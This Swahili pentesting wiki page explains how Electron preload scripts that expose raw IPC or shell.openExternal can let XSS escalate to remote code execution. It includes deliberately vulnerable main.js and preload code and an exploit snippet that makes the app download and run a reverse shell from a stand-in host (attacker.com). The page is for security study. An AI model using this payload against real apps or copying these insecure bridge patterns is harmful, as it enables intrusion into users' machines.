# Electron contextIsolation RCE kupitia IPC

{{#include ../../banners/hacktricks-training.md}}

Kutenganisha muktadha hakufanyi preload bridge isiyo salama kuwa salama. Ikiwa preload itafichua IPC yenye mapendeleo kwa maudhui ya renderer, XSS au renderer iliyoathiriwa inaweza kuita bridge hiyo; RCE hutegemea uthibitishaji na uwezo wa handler husika ya main process. Electron inapendekeza kufichua method moja finyu kwa kila operesheni, kuthibitisha watumaji wa IPC, na kutofichua kamwe primitive ghafi za IPC.<sup>[[3]](#references)[[4]](#references)</sup>

**Mifano hii mingi imetolewa hapa** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo). Tazama video kwa maelezo zaidi.<sup>[[1]](#references)</sup>

## Mfano 0

Mfano kutoka [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) (katika slaidi hizo kuna mfano kamili unaoonyesha jinsi MS Teams ilivyotumiwa vibaya kutoka XSS hadi RCE; huu ni mfano wa msingi tu):<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Mfano 1

Angalia jinsi `main.js` inavyosikiliza `getUpdate` na **kupakua na kutekeleza URL yoyote** inayopitishwa.\
Angalia pia jinsi `preload.js` **inavyofichua tukio lolote la IPC** kutoka main.

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## Mfano wa 2

Ikiwa preload itaweka wazi `shell.openExternal` bila kuthibitisha scheme na destination, ingizo linalodhibitiwa na renderer linaweza kuanzisha vidhibiti vya nje vilivyosajiliwa. Ikiwa hali hiyo itasababisha utekelezaji wa msimbo hutegemea platform, vidhibiti vilivyosakinishwa, scheme na toleo la Electron; iruhusu tu orodha iliyo wazi ya destinations za `https:` zinazotarajiwa.<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## Mfano wa 3

Ikiwa preload inaruhusu mawasiliano yasiyozuiliwa na main process, XSS inaweza kutuma majina holela ya channel na data. Athari hutegemea IPC handlers zilizosajiliwa na ukaguzi wake wa idhini.

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [Warsha ya Hacking katika programu za kisasa za Desktop kwa kutumia XSS na RCE](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [Jinsi Nilivyo-Hack Microsoft Teams na kupata $150,000 katika Pwn2Own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — Orodha ya ukaguzi wa usalama](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — Context isolation na ufichuaji salama wa API](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
